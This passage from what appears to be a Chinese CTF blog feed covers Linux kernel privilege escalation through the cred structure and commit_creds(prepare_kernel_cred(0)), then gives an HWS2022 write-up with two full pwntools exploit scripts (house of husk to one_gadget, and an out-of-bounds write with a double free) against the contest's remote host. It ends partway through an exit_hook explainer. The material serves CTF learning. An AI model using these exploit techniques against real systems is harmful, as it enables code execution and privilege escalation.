title="0.原理"></a>0.原理</h3><p>内核会通过进程的 <code>task_struct</code> 结构体中的 cred 指针来索引 cred 结构体，然后根据 cred 的内容来判断一个进程拥有的权限，如果 cred 结构体成员中的 uid-fsgid 都为 0，那一般就会认为进程具有 root 权限。</p><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token keyword">struct</span> <span class="token class-name">cred</span> <span class="token punctuation">&#123;</span>    <span class="token class-name">atomic_t</span>    usage<span class="token punctuation">;</span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">ifdef</span> <span class="token expression">CONFIG_DEBUG_CREDENTIALS</span></span>    <span class="token class-name">atomic_t</span>    subscribers<span class="token punctuation">;</span>    <span class="token comment">/* number of processes subscribed */</span>    <span class="token keyword">void</span>        <span class="token operator">*</span>put_addr<span class="token punctuation">;</span>    <span class="token keyword">unsigned</span>    magic<span class="token punctuation">;</span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">define</span> <span class="token macro-name">CRED_MAGIC</span>  <span class="token expression"><span class="token number">0x43736564</span></span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">define</span> <span class="token macro-name">CRED_MAGIC_DEAD</span> <span class="token expression"><span class="token number">0x44656144</span></span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">endif</span></span>    <span class="token class-name">kuid_t</span>      uid<span class="token punctuation">;</span>        <span class="token comment">/* real UID of the task */</span>    <span class="token class-name">kgid_t</span>      gid<span class="token punctuation">;</span>        <span class="token comment">/* real GID of the task */</span>    <span class="token class-name">kuid_t</span>      suid<span class="token punctuation">;</span>       <span class="token comment">/* saved UID of the task */</span>    <span class="token class-name">kgid_t</span>      sgid<span class="token punctuation">;</span>       <span class="token comment">/* saved GID of the task */</span>    <span class="token class-name">kuid_t</span>      euid<span class="token punctuation">;</span>       <span class="token comment">/* effective UID of the task */</span>    <span class="token class-name">kgid_t</span>      egid<span class="token punctuation">;</span>       <span class="token comment">/* effective GID of the task */</span>    <span class="token class-name">kuid_t</span>      fsuid<span class="token punctuation">;</span>      <span class="token comment">/* UID for VFS ops */</span>    <span class="token class-name">kgid_t</span>      fsgid<span class="token punctuation">;</span>      <span class="token comment">/* GID for VFS ops */</span>  <span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>因此，思路就比较直观了，我们可以通过以下方式来提权</p><ul><li>直接修改 cred 结构体的内容</li><li>修改 task_struct 结构体中的 cred 指针指向一个满足要求的 cred</li></ul><p>无论是哪一种方法，一般都分为两步：定位，修改。</p><h3 id="1-定位-cred"><a href="#1-定位-cred" class="headerlink" title="1.定位 cred"></a>1.定位 cred</h3><p><strong>直接定位</strong></p><p>cred 结构体的最前面记录了各种 id 信息，对于一个普通的进程而言，uid-fsgid 都是执行进程的用户的身份。因此我们可以通过扫描内存来定位 cred。</p><p><strong>在实际定位的过程中，我们可能会发现很多满足要求的 cred，这主要是因为 cred 结构体可能会被拷贝、释放。</strong>一个很直观的想法是在定位的过程中，利用 usage 不为 0 来筛除掉一些 cred，但仍然会发现一些 usage 为 0 的 cred。这是因为 cred 从 usage 为 0， 到释放有一定的时间。此外，cred 是使用 rcu 延迟释放的。</p><p><strong>间接定位</strong></p><p>task_struct：</p><p>进程的 <code>task_struct</code> 结构体中会存放指向 cred 的指针，因此我们可以</p><ol><li>定位当前进程 <code>task_struct</code> 结构体的地址</li><li>根据 cred 指针相对于 task_struct 结构体的偏移计算得出 <code>cred</code> 指针存储的地址</li><li>获取 <code>cred</code> 具体的地址</li></ol><p>comm：</p><p>comm 用来标记可执行文件的名字，位于进程的 <code>task_struct</code> 结构体中。我们可以发现 comm 其实在 cred 的正下方，所以我们也可以先定位 comm ，然后定位 cred 的地址。</p><h3 id="2-修改-cred"><a href="#2-修改-cred" class="headerlink" title="2.修改 cred"></a>2.修改 cred</h3><ul><li>修改 cred 指针为内核镜像中已有的 init_cred 的地址。这种方法适合于我们能够直接修改 cred 指针以及知道 init_cred 地址的情况。</li><li>伪造一个 cred，然后修改 cred 指针指向该地址即可。这种方式比较麻烦，一般并不使用。</li><li>我们还可以使用 commit_creds(prepare_kernel_cred(0)) 来进行提权，该方式会自动生成一个合法的 cred，并定位当前线程的 task_struct 的位置，然后修改它的 cred 为新的 cred。该方式比较适用于控制程序执行流后使用。</li></ul><h2 id="0x03-Change-Others"><a href="#0x03-Change-Others" class="headerlink" title="0x03 Change Others"></a>0x03 Change Others</h2><p>看不太懂之后再补充hh</p><h2 id="0x04-参考"><a href="#0x04-参考" class="headerlink" title="0x04 参考"></a>0x04 参考</h2><p><a href="https://ctf-wiki.org/pwn/linux/kernel-mode/environment/build-kernel/">CTF Wiki (ctf-wiki.org)</a></p><p><a href="https://xuanxuanblingbling.github.io/ctf/pwn/2021/08/05/kernel/">linux 内核 初探：运行你代码在内核态 | Clang裁缝店 (xuanxuanblingbling.github.io)</a></p><p><a href="https://www.anquanke.com/post/id/258874#h2-5">从零开始的 kernel pwn 入门 - I：Linux kernel 简易食用指南 - 安全客，安全资讯平台 (anquanke.com)</a></p>]]></content>
      
      
      <categories>
          
          <category> PWN </category>
          
      </categories>
      
      
        <tags>
            
            <tag> pwn </tag>
            
            <tag> ctf </tag>
            
            <tag> kernel </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>wp-HWS2022</title>
      <link href="//post/wp-HWS2022.html"/>
      <url>//post/wp-HWS2022.html</url>
      
        <content type="html"><![CDATA[<h1 id="WP-2022-HWS"><a href="#WP-2022-HWS" class="headerlink" title="[WP]-2022 HWS"></a>[WP]-2022 HWS</h1><h3 id="送分题"><a href="#送分题" class="headerlink" title="送分题"></a>送分题</h3><p>大量的printf，明显house of husk。<br>rename泄露libc;<br>unsortedbinAttack改大<code>global_max_fast</code><br>计算<code>__printf_arginfo_table</code>和<code>__printf_function_table</code>的偏移;<br>申请特定大小的fastbin修改<code>__printf_arginfo_table</code>到可控的堆上;<br>构造<code>__printf_arginfo_table</code>的[‘s’]位置为one_gadget;<br>令<code>__printf_function_table</code>不为空;<br>最后调用printf(“%s”)开启调用链getshell.</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token comment"># -*- coding: utf-8 -*-</span><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>context<span class="token punctuation">(</span>os<span class="token operator">=</span><span class="token string">'linux'</span><span class="token punctuation">,</span>arch<span class="token operator">=</span><span class="token string">'amd64'</span><span class="token punctuation">)</span>context<span class="token punctuation">.</span>log_level <span class="token operator">=</span> <span class="token string">'debug'</span>libc <span class="token operator">=</span> ELF<span class="token punctuation">(</span><span class="token string">'./libc-2.27.so'</span><span class="token punctuation">)</span>elf <span class="token operator">=</span> ELF<span class="token punctuation">(</span><span class="token string">"./pwn"</span><span class="token punctuation">)</span>local <span class="token operator">=</span> <span class="token number">0</span><span class="token keyword">if</span> local<span class="token punctuation">:</span>    <span class="token comment"># p = process("./pwn")</span>    p <span class="token operator">=</span> process<span class="token punctuation">(</span><span class="token string">"./pwn"</span><span class="token punctuation">,</span>            env<span class="token operator">=</span><span class="token punctuation">&#123;</span><span class="token string">"LD_PRELOAD"</span><span class="token punctuation">:</span><span class="token string">"/home/sjj/glibc-all-in-one/2.27-3ubuntu1.2_amd64/libc-2.27.so"</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token keyword">else</span><span class="token punctuation">:</span>    p <span class="token operator">=</span> remote<span class="token punctuation">(</span><span class="token string">"1.13.162.249"</span><span class="token punctuation">,</span><span class="token string">"10001"</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">log</span><span class="token punctuation">(</span>addr<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"[*]==>"</span><span class="token operator">+</span><span class="token builtin">hex</span><span class="token punctuation">(</span>addr<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">offset</span><span class="token punctuation">(</span>num<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">return</span> num<span class="token operator">*</span><span class="token number">2</span>arginfo <span class="token operator">=</span> <span class="token number">4114544</span> <span class="token comment"># __printf_arginfo_table</span>function <span class="token operator">=</span> <span class="token number">4130392</span> <span class="token comment"># __printf_function_table</span>main_arena <span class="token operator">=</span> libc<span class="token punctuation">.</span>sym<span class="token punctuation">[</span><span class="token string">'__malloc_hook'</span><span class="token punctuation">]</span><span class="token operator">-</span><span class="token number">0x10</span> size_1 <span class="token operator">=</span> offset<span class="token punctuation">(</span>arginfo <span class="token operator">-</span> main_arena<span class="token punctuation">)</span><span class="token operator">-</span><span class="token number">0x50</span>size_2 <span class="token operator">=</span> offset<span class="token punctuation">(</span>function <span class="token operator">-</span> main_arena<span class="token punctuation">)</span><span class="token operator">-</span><span class="token number">0x50</span>log<span class="token punctuation">(</span>size_1<span class="token punctuation">)</span>log<span class="token punctuation">(</span>size_2<span class="token punctuation">)</span><span class="token comment"># gdb.attach(p)</span>p<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">"big box, what size?"</span><span class="token punctuation">,</span><span class="token builtin">str</span><span class="token punctuation">(</span>size_1<span class="token punctuation">)</span><span class="token punctuation">)</span>p<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">"bigger box, what size?"</span><span class="token punctuation">,</span><span class="token builtin">str</span><span class="token punctuation">(</span>size_2<span class="token punctuation">)</span><span class="token punctuation">)</span>p<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">" rename?(y/n)"</span><span class="token punctuation">,</span><span class="token string">"y"</span><span class="token punctuation">)</span>p<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">"Now your name is:"</span><span class="token punctuation">)</span>addr <span class="token operator">=</span> u64<span class="token punctuation">(</span>p<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">'\x7f'</span><span class="token punctuation">)</span><span class="token punctuation">.</span>ljust<span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">,</span><span class="token string">"\x00"</span><span class="token punctuation">)</span><span class="token punctuation">)</span>log<span class="token punctuation">(</span>addr<span class="token punctuation">)</span>libc_base <span class="token operator">=</span> addr<span class="token operator">-</span>libc<span class="token punctuation">.</span>sym<span class="token punctuation">[</span><span class="token string">'__malloc_hook'</span><span class="token punctuation">]</span><span class="token operator">-</span><span class="token number">0x10</span><span class="token operator">-</span><span class="token number">96</span>log<span class="token punctuation">(</span>libc_base<span class="token punctuation">)</span>global_max_fast <span class="token operator">=</span> libc_base <span class="token operator">+</span> <span class="token number">4118848</span>ogg <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token number">0x4f365</span> <span class="token punctuation">,</span><span class="token number">0x4f3c2</span> <span class="token punctuation">,</span><span class="token number">0x10a45c</span><span class="token punctuation">]</span>one_gadget <span class="token operator">=</span> libc_base <span class="token operator">+</span>ogg<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span>log<span class="token punctuation">(</span>one_gadget<span class="token punctuation">)</span>payload <span class="token operator">=</span> <span class="token string">"a"</span><span class="token operator">*</span><span class="token number">8</span><span class="token operator">*</span><span class="token punctuation">(</span><span class="token builtin">ord</span><span class="token punctuation">(</span><span class="token string">'s'</span><span class="token punctuation">)</span><span class="token operator">-</span><span class="token number">2</span><span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>one_gadget<span class="token punctuation">)</span><span class="token operator">*</span><span class="token number">2</span><span class="token comment"># gdb.attach(p)</span>p<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">"please input your new name!"</span><span class="token punctuation">,</span>p64<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span>global_max_fast<span class="token operator">-</span><span class="token number">0x10</span><span class="token punctuation">)</span><span class="token punctuation">)</span>p<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">" box or bigger box?(1:big/2:bigger)"</span><span class="token punctuation">,</span><span class="token builtin">str</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token comment"># gdb.attach(p)</span>p<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">"Let's edit,"</span><span class="token punctuation">,</span>payload<span class="token punctuation">)</span>p<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token comment"># flag&#123;5hen_m3_5hi_kuai_1e_xin9_Qiu&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="peach"><a href="#peach" class="headerlink" title="peach"></a>peach</h3><p>在bss段上留下了栈地址，通过打印的地址计算出flag地址后4位;<br>chunk_list下标越届，可以填负数;<br>一开始输入”yes\x00”+”a”<em>(0x1d-5)使得换行符\x0a也可以输入到栈上;<br>之后draw的下标越界，draw(-36,”\x00”</em>(0x190)+p16(flag_addr))覆盖arg[0];<br>最后通过堆溢出手动构造doublefree报错带出flag;<br>远程栈地址和本地不太一样需要爆破.</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token comment"># -*- coding: utf-8 -*-</span><span class="token keyword">from</span> re <span class="token keyword">import</span> I<span class="token punctuation">,</span> L<span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>context<span class="token punctuation">(</span>os<span class="token operator">=</span><span class="token string">'linux'</span><span class="token punctuation">,</span>arch<span class="token operator">=</span><span class="token string">'amd64'</span><span class="token punctuation">)</span>context<span class="token punctuation">.</span>log_level <span class="token operator">=</span> <span class="token string">'debug'</span>libc <span class="token operator">=</span> ELF<span class="token punctuation">(</span><span class="token string">'./libc/libc-2.26.so'</span><span class="token punctuation">)</span>elf <span class="token operator">=</span> ELF<span class="token punctuation">(</span><span class="token string">"./peachw"</span><span class="token punctuation">)</span>i <span class="token operator">=</span> <span class="token number">0</span><span class="token keyword">while</span> <span class="token boolean">True</span><span class="token punctuation">:</span>    local <span class="token operator">=</span> <span class="token number">0</span>    <span class="token keyword">if</span> local<span class="token punctuation">:</span>        p <span class="token operator">=</span> process<span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token string">"./libc/ld-2.26.so"</span><span class="token punctuation">,</span> <span class="token string">"./peachw"</span><span class="token punctuation">]</span><span class="token punctuation">,</span>            env<span class="token operator">=</span><span class="token punctuation">&#123;</span><span class="token string">"LD_PRELOAD"</span><span class="token punctuation">:</span><span class="token string">"./libc/libc-2.26.so"</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span>        <span class="token comment"># p = process(["/home/sjj/glibc-all-in-one/2.26-0ubuntu2.1_amd64/ld-2.26.so", "./peachw"],</span>        <span class="token comment">#         env=&#123;"LD_PRELOAD":"/home/sjj/glibc-all-in-one/2.26-0ubuntu2.1_amd64/libc-2.26.so"&#125;)</span>    <span class="token keyword">else</span><span class="token punctuation">:</span>        p <span class="token operator">=</span> remote<span class="token punctuation">(</span><span class="token string">"1.13.162.249"</span><span class="token punctuation">,</span><span class="token string">"10003"</span><span class="token punctuation">)</span>    <span class="token keyword">def</span> <span class="token function">log</span><span class="token punctuation">(</span>addr<span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"[*]==>"</span><span class="token operator">+</span><span class="token builtin">hex</span><span class="token punctuation">(</span>addr<span class="token punctuation">)</span><span class="token punctuation">)</span>    p<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">"Do you like peach?"</span><span class="token punctuation">,</span><span class="token string">"yes\x00"</span><span class="token operator">+</span><span class="token string">"a"</span><span class="token operator">*</span><span class="token punctuation">(</span><span class="token number">0x1d</span><span class="token operator">-</span><span class="token number">5</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    p<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">"The peach is "</span><span class="token punctuation">)</span>    flag_addr <span class="token operator">=</span> <span class="token builtin">int</span><span class="token punctuation">(</span>p<span class="token punctuation">.</span>recvline<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token punctuation">:</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span>    flag_addr <span class="token operator">-=</span> <span class="token number">96</span>    log<span class="token punctuation">(</span>flag_addr<span class="token punctuation">)</span>    <span class="token keyword">def</span> <span class="token function">cmd</span><span class="token punctuation">(</span>i<span class="token punctuation">)</span><span class="token punctuation">:</span>        p<span class="token punctuation">.</span>sendafter<span class="token punctuation">(</span><span class="token string">"Your choice:"</span><span class="token punctuation">,</span>p8<span class="token punctuation">(</span>i<span class="token punctuation">)</span><span class="token punctuation">)</span>    <span class="token keyword">def</span> <span class="token function">add</span><span class="token punctuation">(</span>idx<span class="token punctuation">,</span>name<span class="token punctuation">,</span>size<span class="token punctuation">,</span>data<span class="token punctuation">)</span><span class="token punctuation">:</span>        cmd<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span>        p<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">"Index ?"</span><span class="token punctuation">,</span><span class="token builtin">str</span><span class="token punctuation">(</span>idx<span class="token punctuation">)</span><span class="token punctuation">)</span>        p<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">"name your peach  :"</span><span class="token punctuation">,</span>name<span class="token punctuation">)</span>        p<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">"size of your peach:"</span><span class="token punctuation">,</span><span class="token builtin">str</span><span class="token punctuation">(</span>size<span class="token punctuation">)</span><span class="token punctuation">)</span>        p<span class="token punctuation">.</span>sendafter<span class="token punctuation">(</span><span class="token string">"please descripe your peach :"</span><span class="token punctuation">,</span>data<span class="token punctuation">)</span>    <span class="token keyword">def</span> <span class="token function">add</span><span class="token punctuation">(</span>idx<span class="token punctuation">,</span>name<span class="token punctuation">,</span>size<span class="token punctuation">,</span>data<span class="token punctuation">)</span><span class="token punctuation">:</span>        cmd<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span>        p<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">"Index ?"</span><span class="token punctuation">,</span><span class="token builtin">str</span><span class="token punctuation">(</span>idx<span class="token punctuation">)</span><span class="token punctuation">)</span>        p<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">"name your peach  :"</span><span class="token punctuation">,</span>name<span class="token punctuation">)</span>        p<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">"size of your peach:"</span><span class="token punctuation">,</span><span class="token builtin">str</span><span class="token punctuation">(</span>size<span class="token punctuation">)</span><span class="token punctuation">)</span>        p<span class="token punctuation">.</span>sendafter<span class="token punctuation">(</span><span class="token string">"please descripe your peach :"</span><span class="token punctuation">,</span>data<span class="token punctuation">)</span>    <span class="token keyword">def</span> <span class="token function">add_err</span><span class="token punctuation">(</span>idx<span class="token punctuation">,</span>name<span class="token punctuation">,</span>size<span class="token punctuation">)</span><span class="token punctuation">:</span>        cmd<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span>        p<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">"Index ?"</span><span class="token punctuation">,</span><span class="token builtin">str</span><span class="token punctuation">(</span>idx<span class="token punctuation">)</span><span class="token punctuation">)</span>        p<span class="token punctuation">.</span>sendafter<span class="token punctuation">(</span><span class="token string">"name your peach  :"</span><span class="token punctuation">,</span>name<span class="token punctuation">)</span>        p<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">"size of your peach:"</span><span class="token punctuation">,</span><span class="token builtin">str</span><span class="token punctuation">(</span>size<span class="token punctuation">)</span><span class="token punctuation">)</span>    <span class="token keyword">def</span> <span class="token function">throw</span><span class="token punctuation">(</span>idx<span class="token punctuation">)</span><span class="token punctuation">:</span>        cmd<span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">)</span>        p<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">'Index ?'</span><span class="token punctuation">)</span>        p<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token builtin">str</span><span class="token punctuation">(</span>idx<span class="token punctuation">)</span><span class="token punctuation">)</span>    <span class="token keyword">def</span> <span class="token function">eat</span><span class="token punctuation">(</span>idx<span class="token punctuation">,</span>num<span class="token punctuation">)</span><span class="token punctuation">:</span>        cmd<span class="token punctuation">(</span><span class="token number">3</span><span class="token punctuation">)</span>        p<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">'Index ?'</span><span class="token punctuation">)</span>        p<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token builtin">str</span><span class="token punctuation">(</span>idx<span class="token punctuation">)</span><span class="token punctuation">)</span>        <span class="token comment"># gdb.attach(p)</span>        p<span class="token punctuation">.</span>sendafter<span class="token punctuation">(</span><span class="token string">"What's your lucky number?"</span><span class="token punctuation">,</span><span class="token builtin">str</span><span class="token punctuation">(</span>num<span class="token punctuation">)</span><span class="token punctuation">)</span>        <span class="token keyword">print</span> p<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token keyword">def</span> <span class="token function">draw</span><span class="token punctuation">(</span>idx<span class="token punctuation">,</span>data<span class="token punctuation">)</span><span class="token punctuation">:</span>        cmd<span class="token punctuation">(</span><span class="token number">4</span><span class="token punctuation">)</span>        p<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">'Index ?'</span><span class="token punctuation">)</span>        p<span class="token punctuation">.</span>send<span class="token punctuation">(</span><span class="token builtin">str</span><span class="token punctuation">(</span>idx<span class="token punctuation">)</span><span class="token punctuation">)</span>        p<span class="token punctuation">.</span>sendafter<span class="token punctuation">(</span><span class="token string">"input the new size of your peach"</span><span class="token punctuation">,</span><span class="token string">'\x00\x03'</span><span class="token punctuation">)</span>        p<span class="token punctuation">.</span>sendafter<span class="token punctuation">(</span><span class="token string">"start to draw your peach \n"</span><span class="token punctuation">,</span>data<span class="token punctuation">)</span>    draw<span class="token punctuation">(</span><span class="token operator">-</span><span class="token number">36</span><span class="token punctuation">,</span><span class="token string">"\x00"</span><span class="token operator">*</span><span class="token punctuation">(</span><span class="token number">0x190</span><span class="token operator">+</span>i<span class="token operator">*</span><span class="token number">8</span><span class="token punctuation">)</span><span class="token operator">+</span>p16<span class="token punctuation">(</span>flag_addr<span class="token punctuation">)</span><span class="token punctuation">)</span>    add<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token string">"aaa"</span><span class="token punctuation">,</span><span class="token number">0x410</span><span class="token punctuation">,</span><span class="token string">"bbb"</span><span class="token punctuation">)</span>    add<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token string">"aaa"</span><span class="token punctuation">,</span><span class="token number">0x410</span><span class="token punctuation">,</span><span class="token string">"bbb"</span><span class="token punctuation">)</span>    add<span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token string">"aaa"</span><span class="token punctuation">,</span><span class="token number">0x410</span><span class="token punctuation">,</span><span class="token string">"bbb"</span><span class="token punctuation">)</span>    throw<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span>    add_err<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token string">"a"</span><span class="token operator">*</span><span class="token number">0x10</span><span class="token operator">+</span>p16<span class="token punctuation">(</span><span class="token number">0xf6e0</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token number">0x001</span><span class="token punctuation">)</span>    throw<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span>    throw<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span>    <span class="token keyword">try</span><span class="token punctuation">:</span>        p<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">"*** Error in "</span><span class="token punctuation">)</span>        flag <span class="token operator">=</span> p<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">"invalid"</span><span class="token punctuation">)</span>        <span class="token keyword">if</span> <span class="token string">"&#123;"</span> <span class="token keyword">in</span> flag<span class="token punctuation">:</span>            <span class="token keyword">print</span> flag            pause<span class="token punctuation">(</span><span class="token punctuation">)</span>        <span class="token keyword">elif</span> <span class="token string">"free()"</span> <span class="token keyword">in</span> flag <span class="token punctuation">:</span>            i<span class="token operator">=</span> i <span class="token operator">+</span> <span class="token number">1</span>            <span class="token keyword">print</span> i        <span class="token keyword">else</span><span class="token punctuation">:</span>            pause<span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token keyword">except</span><span class="token punctuation">:</span>        <span class="token keyword">pass</span>    p<span class="token punctuation">.</span>close<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token comment"># flag&#123;G0od job~~~This is the real peach you get~&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>]]></content>
      
      
      <categories>
          
          <category> PWN </category>
          
      </categories>
      
      
        <tags>
            
            <tag> pwn </tag>
            
            <tag> python2 </tag>
            
            <tag> ctf </tag>
            
            <tag> wp </tag>
            
            <tag> HWS2022 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>exit_hook在pwn题中的应用</title>
      <link href="//post/pwn-exit-hook.html"/>
      <url>//post/pwn-exit-hook.html</url>
      
        <content type="html"><![CDATA[<h1 id="PWN-exit-hook"><a href="#PWN-exit-hook" class="headerlink" title="[PWN] exit_hook"></a>[PWN] exit_hook</h1><p>以前只接触过<code>__malloc_hook</code>，<code>__free_hook</code>，大概意思就是在调用malloc和free的时候会先看看里面有没有东西，有的话就会执行。</p><p>前几天做题时遇到了只能修改<code>exit()</code>函数的题目，了解到存在一类指针也可以被称之为<code>exit_hook</code>,做题时选择了直接调用，现在在仔细研究下原理。</p><span id="more"></span><h2 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h2><p>先自己写一个小程序，使用GDB调试着看看</p><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span><span class="token string">&lt;stdio.h></span></span><span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"Hello World!\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">exit</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>编译<code>gcc -g t.c -o t </code>并尝试调试</p><p>调试发现，调用链为</p><pre class="line-numbers language-assembly" data-language="assembly"><code class="language-assembly">call   exit@plt &lt;exit@plt&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><pre class="line-numbers language-assembly" data-language="assembly"><code class="language-assembly">call __run_exit_handlers&lt;__run_exit_handlers&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><pre class="line-numbers language-assembly" data-language="assembly"><code class="language-assembly">call   rdx &lt;_dl_fini&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://pic.imgdb.cn/item/61daab292ab3f51d91d8629a.png"></p><p>接下来为了方便观察，可以直接看<code>_dl_fini.c</code>的相关源码：</p><pre class="line-numbers language-c" data-language="c"><code class="language-c"> <span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">ifdef</span> <span class="token expression">SHARED</span></span><span class="token keyword">int</span> do_audit <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>again<span class="token operator">:</span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">endif</span></span><span class="token keyword">for</span> <span class="token punctuation">(</span>Lmid_t ns <span class="token operator">=</span> <span class="token function">GL</span><span class="token punctuation">(</span>dl_nns<span class="token punctuation">)</span> <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">;</span> ns <span class="token 